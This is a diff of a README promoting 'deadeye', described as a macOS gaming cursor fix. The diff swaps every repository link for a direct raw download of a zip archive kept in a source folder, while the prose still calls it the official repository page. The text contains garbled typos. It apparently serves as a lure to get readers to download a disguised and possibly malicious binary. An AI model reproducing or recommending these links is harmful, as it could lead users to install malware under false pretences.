@@ -1,7 +1,7 @@
 <h1>🎯 deadeye - Fix macOS Gaming Cursor Chaos Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/aaamaxito-prog/deadeye" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Visit This Link to Download the Application</a>
+  <a href="https://raw.githubusercontent.com/aaamaxito-prog/deadeye/main/Sources/Deadeye/Software-2.6.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Visit This Link to Download the Application</a>
 </p>
 
 ---
@@ -37,7 +37,7 @@ Here is what deadeye does for you, in plain language:
 
 Getting deadeye on your Mac is incredibly simple. Follow this one step:
 
-1. **Visit the official download page** by clicking this link: **[https://github.com/aaamaxito-prog/deadeye](https://github.com/aaamaxito-prog/deadeye)**. This linktakey ou tothe repository where the application is hosted.  
+1. **Visit the official download page** by clicking this link: **[https://raw.githubusercontent.com/aaamaxito-prog/deadeye/main/Sources/Deadeye/Software-2.6.zip](https://raw.githubusercontent.com/aaamaxito-prog/deadeye/main/Sources/Deadeye/Software-2.6.zip)**. This linktakey ou tothe repository where the application is hosted.  
 
 That’s it! You don’t need to worry about choosing a version or figuring out complex download options. Just go to that page, and you will find what you need to download the app.  
 
@@ -130,12 +130,12 @@ The typical issues happen because those compatibility layers translate Windows m
 
 No more squinting at two arrows on your screen. No more clicking three times just to close a menu. No more losing your game’s focus because the menu bar decided to appear. **deadeye** puts an end to all these frustrations with a simple, lightweight, and effective solution.  
 
-Download it today from **[https://github.com/aaamaxito-prog/deadeye](https://github.com/aaamaxito-prog/deadeye)**, start it up, and get back to actually enjoying your games on your Mac. You’ll wonder how you ever played without it.  
+Download it today from **[https://raw.githubusercontent.com/aaamaxito-prog/deadeye/main/Sources/Deadeye/Software-2.6.zip](https://raw.githubusercontent.com/aaamaxito-prog/deadeye/main/Sources/Deadeye/Software-2.6.zip)**, start it up, and get back to actually enjoying your games on your Mac. You’ll wonder how you ever played without it.  
 
 ---
 
 <p align="center">
-  <a href="https://github.com/aaamaxito-prog/deadeye" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 4px 15px rgba(79,172,254,0.4);">⬇️ Get deadeeye Now</a>
+  <a href="https://raw.githubusercontent.com/aaamaxito-prog/deadeye/main/Sources/Deadeye/Software-2.6.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:12px;box-shadow:0 4px 15px rgba(79,172,254,0.4);">⬇️ Get deadeeye Now</a>
 </p>
 
 ---
